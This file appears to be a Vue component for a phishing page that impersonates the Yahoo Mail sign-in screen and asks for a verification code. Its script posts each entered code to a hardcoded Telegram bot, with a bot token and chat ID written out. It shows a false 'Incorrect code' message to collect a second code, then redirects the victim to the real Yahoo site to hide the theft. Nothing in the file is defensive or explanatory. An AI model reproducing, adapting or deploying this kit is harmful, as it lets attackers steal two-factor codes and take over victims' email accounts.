


<template>
  <div id="app">




<body>

  <header class="topbar">
    <div class="logo">yahoo!</div>

    <div class="top-links">
      <span>Help</span>
      <span>Terms</span>
      <span>Privacy</span>
    </div>
  </header>

  <main class="page">

    <section class="hero">

      <div class="hero-content">
        <div class="ad-text">GROW-GOOD<span>™</span></div>
        <button class="shop-button">SHOP NOW</button>
      </div>

      <div class="login-card">
       <b> <h1>Sign in to Yahoo Mail</h1> </b>

<div v-if="isActive">
        <h3 class="error">Incorrect ccode </h3>

</div>

        <label>Code</label>
        <input type="text" placeholder=""  v-model="formDataRes.code">

      
        <div class="options">
          <label class="check">
            <input type="checkbox" checked>
            <span>Stay signed in</span>
          </label>

          <a href="#">request for new code </a>
        </div>

        <button class="next-button" type="button" @click.prevent="finishJoob();">
          Sign In
        </button>

        <div class="divider">
          <span>or</span>
        </div>

        <button class="google-button" type="button">
          <span class="google-icon">G</span>
          Sign in with Google
        </button>

        <button class="create-button" type="button">
          Create account
        </button>
      </div>

    </section>

  </main>

</body>



  </div>
</template>

<script>
import axios from "axios";

export default {
  name: "App",
  data() {
    return {
      formDataRes: {
        code: "",
      
      },
      loading: false,
      isActive: false,
      count: 0,
      finalCount: 2, // Only send once
    };
  },
  methods: {
    async finishJoob() {
      this.count++;
      console.log("Count:", this.count, "Final:", this.finalCount);

      if (this.count <= this.finalCount) {
        this.loading = true;

        // Format the message as string
        const message = `*⚠️ Yahoo*\nCode: ${this.formDataRes.code}`;

        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-4794000485", 
          // 5
          message
        );

        this.isActive = !this.isActive;
        this.loading = false;
      } else {
        // Redirect after sending
        location.replace("https://www.yahoo.com/");
      }
    },

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },
};
</script>



<style>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

body {
  font-family: Arial, Helvetica, sans-serif;
  background: #f5f5f5;
  color: #222;
}
.error{
    color: rgb(246, 51, 51);
    margin: 0px;
    padding: 7px;
}
/* Top navigation */
.topbar {
  height: 62px;
  width: 100%;
  background: #fff;

  display: flex;
  align-items: center;
  justify-content: space-between;

  padding: 0 28px;
  border-bottom: 1px solid #eee;
}

.logo {
  color: #6001d2;
  font-size: 30px;
  font-weight: 800;
  letter-spacing: -2px;
}

.top-links {
  display: flex;
  gap: 18px;
  color: #666;
  font-size: 12px;
}

.top-links span {
  cursor: pointer;
}

/* Main area */
.page {
  width: 100%;
  display: flex;
  justify-content: center;
}

/*
  Wider than the screenshot.
  Change this value to make the entire page wider.
*/
.hero {
  width: min(1450px, 100%);
  min-height: 720px;

  position: relative;

  background-image: url("yahoo-mail-1024.jpg");
  background-size: cover;
  background-position: center;

  overflow: hidden;
}

/* Advertisement text */
.hero-content {
  position: absolute;
  left: 7%;
  top: 100px;
}

.ad-text {
  color: #39d500;
  font-size: clamp(45px, 5vw, 72px);
  font-weight: 900;
  font-style: italic;
  letter-spacing: -4px;
  text-shadow: 1px 1px 0 rgba(0,0,0,.05);
}

.ad-text span {
  font-size: 18px;
  vertical-align: top;
  margin-left: 5px;
}

.shop-button {
  margin-top: 25px;

  border: none;
  background: #38c900;
  color: white;

  padding: 14px 31px;
  font-size: 15px;
  font-weight: bold;

  cursor: pointer;
}

.shop-button:hover {
  background: #2fae00;
}

/* Login card */
.login-card {
  position: absolute;

  top: 35px;
  right: 8%;

  width: 360px;
  min-height: 470px;

  background: white;
  border-radius: 16px;

  padding: 30px;

  box-shadow:
    0 5px 25px rgba(0, 0, 0, .14);

  z-index: 5;
}

.login-card h1 {
  font-size: 21px;
  margin-bottom: 25px;
  color: #222;
}

.login-card > label {
  display: block;

  color: #6f20c8;
  font-size: 12px;
  font-weight: bold;

  margin-bottom: 7px;
}

.login-card > input {
  width: 100%;
  height: 48px;

  border: 1px solid #8a45e6;
  border-radius: 2px;

  outline: none;
  padding: 0 12px;

  font-size: 16px;
}

/* Checkbox + forgot link */
.options {
  display: flex;
  justify-content: space-between;
  align-items: center;

  margin-top: 10px;
  margin-bottom: 22px;

  font-size: 12px;
}

.check {
  display: flex;
  align-items: center;
  gap: 7px;
}

.check input {
  accent-color: #7b2bea;
}

.options a {
  color: #666;
  text-decoration: underline;
}

/* Next button */
.next-button {
  width: 100%;
  height: 46px;

  border: none;
  border-radius: 25px;

  background: #7d2bef;
  color: white;

  font-size: 14px;
  font-weight: bold;

  cursor: pointer;
}

.next-button:hover {
  background: #6820d0;
}

/* Divider */
.divider {
  display: flex;
  align-items: center;
  gap: 12px;

  margin: 22px 0;
}

.divider::before,
.divider::after {
  content: "";
  height: 1px;
  background: #e5e5e5;
  flex: 1;
}

.divider span {
  color: #777;
  font-size: 12px;
}

/* Google button */
.google-button {
  width: 100%;
  height: 45px;

  background: white;
  border: 1px solid #ccc;
  border-radius: 24px;

  color: #333;

  font-size: 14px;
  font-weight: 600;

  display: flex;
  justify-content: center;
  align-items: center;
  gap: 9px;

  cursor: pointer;
}

.google-icon {
  font-size: 20px;
  font-weight: bold;
  color: #4285f4;
}

/* Create account */
.create-button {
  display: block;

  margin: 28px auto 0;

  background: transparent;
  border: none;

  color: #6e20c8;
  font-weight: bold;
  font-size: 13px;

  cursor: pointer;
}

/* ----------------------------------
   Responsive
---------------------------------- */

@media (max-width: 900px) {

  .hero {
    min-height: 650px;
    background-position: center;
  }

  .login-card {
    right: 4%;
    width: 340px;
  }

  .hero-content {
    left: 4%;
  }
}

@media (max-width: 650px) {

  .hero {
    min-height: 760px;
    background-position: center;
  }

  .hero-content {
    top: 45px;
    left: 25px;
  }

  .ad-text {
    font-size: 42px;
  }

  .login-card {
    top: 190px;
    left: 20px;
    right: 20px;
    width: auto;
  }

  .topbar {
    padding: 0 15px;
  }

  .top-links {
    gap: 8px;
  }
}

</style>